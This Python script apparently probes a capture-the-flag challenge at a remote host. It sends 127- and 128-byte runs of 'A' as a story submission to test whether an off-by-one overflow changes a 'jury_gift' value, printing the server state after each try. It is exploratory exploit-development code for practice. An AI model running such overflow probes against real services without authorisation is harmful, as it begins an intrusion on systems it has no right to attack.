#!/usr/bin/env python3
import socket
import time
import struct

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(('dyn06.heroctf.fr', 13683))
    return s

def recv_until(s, text):
    data = b''
    while text not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def test_jury_gift():
    s = connect()
    time.sleep(0.5)
    
    # Receive menu
    recv_until(s, b'>')
    
    # Show jury info first to see initial state
    s.send(b'3\n')
    time.sleep(0.5)
    data = recv_until(s, b'>')
    print("Initial jury info:")
    print(data.decode('utf-8', errors='ignore'))
    
    # Submit story with length that might affect jury_gift
    s.send(b'1\n')
    time.sleep(0.5)
    recv_until(s, b':')
    
    # Try different lengths
    for length in [127, 128]:
        print(f"\n=== Testing length {length} ===")
        s.send(f'{length}\n'.encode())
        time.sleep(0.5)
        recv_until(s, b':')
        
        # Send payload
        payload = b'A' * length
        s.send(payload)
        time.sleep(0.5)
        recv_until(s, b'>')
        
        # Show jury info
        s.send(b'3\n')
        time.sleep(0.5)
        data = recv_until(s, b'>')
        print(data.decode('utf-8', errors='ignore'))
        
        # Try to show results
        s.send(b'4\n')
        time.sleep(0.5)
        data = recv_until(s, b'>')
        print("Results:")
        print(data.decode('utf-8', errors='ignore'))
    
    s.close()

if __name__ == '__main__':
    test_jury_gift()
